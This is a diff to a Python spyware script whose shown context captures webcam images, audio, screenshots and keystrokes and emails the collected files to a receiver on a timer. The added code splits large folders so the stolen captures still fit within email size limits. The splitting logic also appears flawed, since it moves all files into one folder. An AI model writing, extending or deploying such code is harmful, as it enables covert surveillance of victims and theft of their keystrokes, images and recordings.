@@ -64,6 +64,14 @@ def capture_and_save_webcam(output_folder):
         time.sleep(save_interval)
     cap.release()
     
+def get_folder_size(folder):
+    total_size = 0
+    for dirpath, dirnames, filenames in os.walk(folder):
+        for filename in filenames:
+            filepath = os.path.join(dirpath, filename)
+            total_size += os.path.getsize(filepath)
+    return total_size
+
 def record_and_save_audio(output_folder):
     while True:
         record_duration = 30  #Duration of each audio recording
@@ -95,6 +103,37 @@ def send_files_email(sender_email, sender_password, receiver_email, files_folder
             server.starttls()
             server.login(sender_email, sender_password)
             server.sendmail(sender_email, receiver_email, msg.as_string())
+
+def split_and_send_email(sender_email, sender_password, receiver_email, folder):
+    total_size = get_folder_size(folder)
+    max_size = 25 * 1024 * 1024  # 25MB in bytes
+
+    if total_size > max_size:
+        # Split folder into two halves
+        half_size = total_size // 2
+        files = [f for f in os.listdir(folder) if os.path.isfile(os.path.join(folder, f))]
+        current_size = 0
+        split_folders = []
+
+        for file in files:
+            file_path = os.path.join(folder, file)
+            current_size += os.path.getsize(file_path)
+
+            if current_size > half_size:
+                # Move files to new split folder
+                split_folder = os.path.join(folder, "split_folder")
+                os.makedirs(split_folder, exist_ok=True)
+                split_folders.append(split_folder)
+                for f in files:
+                    shutil.move(os.path.join(folder, f), split_folder)
+                break
+
+        # Send emails with split folders
+        for split_folder in split_folders:
+            send_files_email(sender_email, sender_password, receiver_email, split_folder)
+            shutil.rmtree(split_folder)
+    else:
+        send_files_email(sender_email, sender_password, receiver_email, folder)
 
 def delete_all_files(folder):
     for file_name in os.listdir(folder):
@@ -252,8 +291,8 @@ keylogger_thread.start()
 while True:
     time.sleep(mail_interval)
     
-    send_files_email(sender_email, sender_password, receiver_email, screenshots_folder)
-    # send_files_email(sender_email, sender_password, receiver_email, webcam_folder)
+    split_and_send_email(sender_email, sender_password, receiver_email, screenshots_folder)
+    # split_and_send_email(sender_email, sender_password, receiver_email, webcam_folder)
     send_files_email(sender_email, sender_password, receiver_email, audio_folder)
     send_files_email(sender_email, sender_password, receiver_email, keylog_folder)
     
